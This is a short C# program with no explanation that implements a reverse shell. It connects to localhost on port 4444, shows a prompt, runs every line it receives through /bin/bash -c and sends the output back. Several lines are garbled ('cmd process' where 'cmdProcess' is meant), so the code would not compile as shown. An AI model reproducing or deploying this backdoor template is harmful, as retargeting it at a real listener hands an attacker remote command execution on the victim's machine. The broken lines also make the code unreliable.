using System;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;

class Program
{
static void Main(string[] args)
{
using (TcpClient client = new TcpClient("localhost", 4444))
{
using (Stream stream = client.GetStream())
using (StreamReader reader = new StreamReader(stream))
using (StreamWriter writer = new StreamWriter(stream))
{
while (true)
{
writer.Write("$ ");
writer.Flush();
string cmd = reader.ReadLine();

if (string.IsNullOrEmpty(cmd))
{
client.Close();
return;
}
else
{
Process cmdProcess = new Process();
cmd process.StartInfo.FileName = "/bin/bash";
cmd process.StartInfo.Arguments = "-c \"" + cmd + "\"";
cmd process.StartInfo.UseShellExecute = false;
cmd process.StartInfo.RedirectStandardOutput = true;
cmd process.Start();

writer.Write(cmdProcess.StandardOutput.ReadToEnd());
writer.Flush();
}
}
}
}
}
}